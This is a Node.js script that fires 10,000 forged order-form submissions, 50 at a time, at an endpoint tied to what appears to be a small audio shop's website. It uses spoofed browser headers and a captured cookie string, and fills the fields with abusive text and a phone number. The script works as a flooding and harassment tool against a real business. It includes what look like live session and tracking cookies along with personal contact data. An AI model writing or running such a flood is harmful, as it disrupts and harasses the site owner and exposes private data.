// Import required modules
const fetch = require('node-fetch'); // For making HTTP requests
const URLSearchParams = require('url').URLSearchParams; // For x-www-form-urlencoded

// --- Configuration for the Form Submission Request ---
// !!! IMPORTANT: You MUST verify these values by inspecting the actual form HTML !!!
// --- Replace these placeholders ---
const FORM_SUBMISSION_URL = "https://www.facebook.com/tr/"; // e.g., /submit-order
const FORM_SUBMISSION_REFERER = "https://www.kh-audio.store/";

// Form data (payload for application/x-www-form-urlencoded)
// The keys here MUST match the 'name' attributes of the HTML input fields.
const FORM_DATA = {
    "customer_name": "FUCK YOUR MOTHER",         // <--- UPDATE 'customer_name' if form field name is different
    "phone_number": "072548566",              // <--- UPDATE 'phone_number' if form field name is different
    "message": "FUCK YOUR MOTHER",     // <--- UPDATE 'message' if form field name is different
    "product_selection": "JBL FLIP 6: 109,000 ៛" // <--- UPDATE 'product_selection' if form field name is different
};

// Headers for form submission
const FORM_HEADERS = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Accept-Language": "en-US,en;q=0.9",
    "Cache-Control": "max-age=0",
    "Connection": "keep-alive",
    "Content-Type": "application/x-www-form-urlencoded", // Crucial
    "Cookie": "_fbc=fb.1.1754276190315.IwZXh0bgNhZW0CMTEAAR4n54UBftT9FSn_L6iPDf9Z77r4WVpfXVIBxd6C7IgQP58QbBV7dytFJAPBUw_aem_RjcQRThcKfYlMhGW25VBqA; _fbp=fb.1.1754276190329.390354343322090381; _p_session_id=9548f66a-4390-496e-948c-2e66d5fc1c09; _aba=CPA2.1754276190604.3.81f9d202-c4d6-441b-adcb-258f4169007a; _abd=CPD2.1754276190605.3.76995051-b080-4474-bd1d-59eb7aed051c; _now-null=1754276207530; _abt=CPT2.1754276339812.3.a84de825-f8cb-4959-b60a-96ec026697c0",
    "Origin": "https://www.kh-audio.store",
    "Referer": FORM_SUBMISSION_REFERER,
    "Sec-Ch-Ua": "\"Microsoft Edge\";v=\"137\", \"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\"",
    "Sec-Ch-Ua-Mobile": "?1",
    "Sec-Ch-Ua-Platform": "\"Android\"",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36 Edg/137.0.0.0",
};


// --- Global Simulation Settings ---
const NUM_REQUESTS = 10000; // Number of form submissions
const MAX_CONCURRENT_REQUESTS = 50; // Number of requests to run in parallel

// Global object to store results for summary
const resultsSummary = {
    "Form Submission": { "2xx": 0, "3xx": 0, "4xx": 0, "5xx": 0, "errors": 0, "total_attempted": 0 },
};

/**
 * Helper function to introduce a delay.
 * @param {number} ms - milliseconds to wait.
 */
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

/**
 * Sends an HTTP form submission request and logs its status, updating results.
 * @param {string} url - Request URL.
 * @param {object} headers - Request headers.
 * @param {object} formDataPayload - Request body (plain object, will be URL-encoded).
 * @param {string} requestId - Identifier for logging this specific request.
 * @param {object} resultsDict - Dictionary to update results.
 */
async function sendFormRequest(url, headers, formDataPayload, requestId, resultsDict) {
    resultsDict.total_attempted++; 

    const fetchOptions = {
        method: 'POST',
        headers: { ...headers }, 
        body: new URLSearchParams(formDataPayload).toString(), // Convert object to URL-encoded string
        timeout: 10000 // 10 seconds timeout
    };

    try {
        const response = await fetch(url, fetchOptions);

        const status = response.status;
        console.log(`  [${requestId}] Status: ${status}`);

        if (status >= 200 && status < 300) {
            resultsDict['2xx']++;
        } else if (status >= 300 && status < 400) {
            resultsDict['3xx']++;
        } else if (status >= 400 && status < 500) {
            resultsDict['4xx']++;
        } else if (status >= 500 && status < 600) {
            resultsDict['5xx']++;
        }
        return response;

    } catch (error) {
        console.error(`  [${requestId}] Error: ${error.message}`);
        resultsDict.errors++;
        return null;
    }
}

/**
 * Simulates a single form submission.
 * @param {number} requestId - The ID of the current request.
 */
async function simulateSingleFormSubmission(requestId) {
    console.log(`\n--- Request ${requestId}/${NUM_REQUESTS} (${new Date().toLocaleTimeString()}) ---`);

    console.log(`[${requestId}] Attempting Form Submission to: ${FORM_SUBMISSION_URL}`);
    await sendFormRequest(
        FORM_SUBMISSION_URL, FORM_HEADERS, FORM_DATA,
        `FORM-${requestId}`, resultsSummary["Form Submission"]
    );

    await delay(100); // Small delay between individual requests for this thread
}

// --- Main execution block ---
async function main() {
    console.log(`Starting to send ${NUM_REQUESTS} form submissions using Node.js.`);
    console.log("-".repeat(70));

    // Create an array of promises, each representing a single form submission
    const requestPromises = [];
    for (let i = 1; i <= NUM_REQUESTS; i++) {
        requestPromises.push(simulateSingleFormSubmission(i));
    }

    // Run requests in batches to control concurrency
    const chunks = [];
    for (let i = 0; i < requestPromises.length; i += MAX_CONCURRENT_REQUESTS) {
        chunks.push(requestPromises.slice(i, i + MAX_CONCURRENT_REQUESTS));
    }

    for (const chunk of chunks) {
        await Promise.all(chunk); // Wait for all promises in the current chunk to resolve
    }

    console.log("\n" + "=".repeat(70));
    console.log("Script finished sending form submissions.");
    console.log("\n--- Overall Summary ---");
    const stats = resultsSummary["Form Submission"];
    console.log(`\n--- Form Submission ---`);
    console.log(`  Total Requests Attempted: ${stats.total_attempted}`);
    console.log(`  Successful (2xx): ${stats['2xx']}`);
    console.log(`  Redirections (3xx): ${stats['3xx']}`);
    console.log(`  Client Errors (4xx): ${stats['4xx']}`);
    console.log(`  Server Errors (5xx): ${stats['5xx']}`);
    console.log(`  Other Errors/Timeouts: ${stats.errors}`);
    console.log("=".repeat(70));
}

main(); // Call the main function to start the simulation